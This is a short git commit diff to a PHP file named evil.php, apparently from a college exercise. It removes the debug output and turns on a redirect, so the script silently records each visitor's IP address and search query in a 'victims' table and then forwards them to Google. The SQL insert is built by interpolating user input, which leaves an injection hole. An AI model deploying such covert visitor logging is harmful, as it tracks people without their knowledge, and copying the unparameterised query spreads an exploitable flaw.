c1802b4cdeafd352e56b08d78e3a4cdfe2408cd7
Andy Su <andy.su@dawsoncollege.qc.ca>
2021-12-21 11:19:54 -0500

    Update evil.php

--- evil.php
+++ evil.php
@@ -15,11 +15,6 @@
             $database = "EVIL"; 
 
             $conn = mysqli_connect($server, $username, $password, $database);
-            if (!$conn) {
-                die("Connection failed: " . mysqli_connect_error());
-                }
-            echo "Connected successfully";
-            echo "<br/>";
 
             $ip = $_SERVER['REMOTE_ADDR']; 
             $q = htmlspecialchars($_GET['query']);
@@ -28,12 +23,8 @@
             $sql = "INSERT INTO victims (ip, query) VALUES ('{$ip}', '{$q}');";
             $result = mysqli_query($conn, $sql);
             
-            echo "<br/>";
-            echo $result ? "Success!" : "Failure: " . mysqli_error($conn); 
-            echo "<br/>";
-
             $url= "https://www.google.com/search?q=" . $q;
-            //header("Location: $url"); 
+            header("Location: $url"); 
 
         ?>
 
